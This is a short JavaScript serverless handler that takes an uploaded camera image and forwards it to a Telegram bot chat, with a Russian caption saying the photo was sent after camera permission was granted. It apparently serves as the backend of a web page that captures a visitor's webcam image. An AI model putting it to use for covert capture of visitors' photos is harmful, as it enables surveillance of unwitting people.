export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({
      error: "Telegram settings are missing"
    });
  }

  try {
    const chunks = [];

    for await (const chunk of req) {
      chunks.push(chunk);
    }

    const image = Buffer.concat(chunks);

    const form = new FormData();

    form.append("chat_id", chatId);
    form.append(
      "caption",
      "📸 Фото отправлено после разрешения камеры."
    );

    form.append(
      "photo",
      new Blob([image], {
        type: "image/jpeg"
      }),
      "camera.jpg"
    );

    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      {
        method: "POST",
        body: form
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      return res.status(500).json({
        error: "Telegram error"
      });
    }

    return res.status(200).json({
      ok: true
    });

  } catch (error) {
    return res.status(500).json({
      error: "Server error"
    });
  }
}
